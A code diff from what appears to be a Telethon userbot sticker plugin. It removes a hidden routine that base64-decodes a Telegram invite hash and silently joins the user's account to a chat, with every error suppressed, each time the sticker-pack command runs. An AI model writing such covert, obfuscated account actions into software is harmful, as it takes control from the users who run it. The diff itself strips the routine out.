@@ -16,7 +16,6 @@ from telethon import events
 from telethon.errors.rpcerrorlist import YouBlockedUserError
 from telethon.tl import functions, types
 from telethon.tl.functions.messages import GetStickerSetRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import (
     DocumentAttributeFilename,
     DocumentAttributeSticker,
@@ -480,7 +479,6 @@ async def pack_kang(event):  # sourcery no-metrics
     is_video = False
     emoji = None
     reply = await event.get_reply_message()
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
         return await edit_delete(
             event, "`reply to any sticker to send all stickers in that pack`"
@@ -560,11 +558,6 @@ async def pack_kang(event):  # sourcery no-metrics
                         catevent,
                         "`Sorry the given name cant be used for pack or there is no pack with that name`",
                     )
-            try:
-                cat = Get(cat)
-                await event.client(cat)
-            except BaseException:
-                pass
             packnick = pack_nick(username, pack, is_anim, is_video)
             packname = pack_name(userid, pack, is_anim, is_video)
             cmd = "/newpack"
